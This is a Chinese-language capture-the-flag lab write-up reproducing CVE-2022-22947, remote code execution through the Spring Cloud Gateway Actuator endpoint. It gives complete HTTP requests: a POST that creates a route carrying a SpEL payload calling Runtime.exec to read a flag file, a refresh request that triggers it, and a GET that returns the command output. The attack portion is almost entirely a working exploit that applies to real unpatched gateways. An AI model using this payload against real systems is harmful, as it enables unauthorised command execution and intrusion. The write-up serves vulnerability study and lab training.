## 漏洞简介：

Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）发生在Spring Cloud
Gateway应用程序的Actuator端点，其在启用、公开和不安全的情况下容易受到代码注入的攻击。攻击者可通过该漏洞恶意创建允许在远程主机上执行任意远程执行的请求。

## 漏洞环境：

春秋云镜中的漏洞靶标，CVE编号为CVE-2022-22947

## 漏洞复现：

访问漏洞环境

![](https://image.3001.net/images/20230702/1688267681_64a0eba1d3ced8e4f5f55.png!small)

  

开启代理打开burpsuite抓取数据包，并放到重放器中

![](https://image.3001.net/images/20230702/1688267751_64a0ebe7ec25e28010feb.png!small)

  

1.修改请求数据包以 POST方法请求 /actuator/gateway/routes/hacktest，并提交数据（用于创建一条恶意路由）

> POST /actuator/gateway/routes/hacktest HTTP/1.1
>
> Host: ip:port
>
> Accept-Encoding: gzip, deflate
>
> Accept: */*
>
> Accept-Language: en
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
>
> Connection: close
>
> Content-Type: application/json
>
> Content-Length: 329
>
>  
>
>
> {
>
> "id": "hacktest",
>
> "filters": [{
>
> "name": "AddResponseHeader",
>
> "args": {
>
> "name": "Result",
>
> "value": "#{new
> String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new
> String[]{\"cat ../../../../../../../flag\"}).getInputStream()))}"
>
> }
>
> }],
>
> "uri": "http://example.com"
>
> }
>
>  
>

![](https://image.3001.net/images/20230702/1688267836_64a0ec3c8ac45d59cf106.png!small)

  

2.发送一下数据包，此数据包会触发表达式执行

> POST /actuator/gateway/refresh HTTP/1.1
>
> Host: ip:port
>
> Accept-Encoding: gzip, deflate
>
> Accept: */*
>
> Accept-Language: en
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
>
> Connection: close
>
> Content-Type: application/x-www-form-urlencoded
>
> Content-Length: 0

![](https://image.3001.net/images/20230702/1688267878_64a0ec66e8f8fa08b9a23.png!small)

  

  3. 发送如下数据包可查看结果，flag就在返回包里

> GET /actuator/gateway/routes/hacktest HTTP/1.1
>
> Host: ip:port
>
> Accept-Encoding: gzip, deflate
>
> Accept: */*
>
> Accept-Language: en
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
>
> Connection: close
>
> Content-Type: application/x-www-form-urlencoded
>
> Content-Length: 0

![](https://image.3001.net/images/20230702/1688268047_64a0ed0fe4c024c047db3.png!small)

  

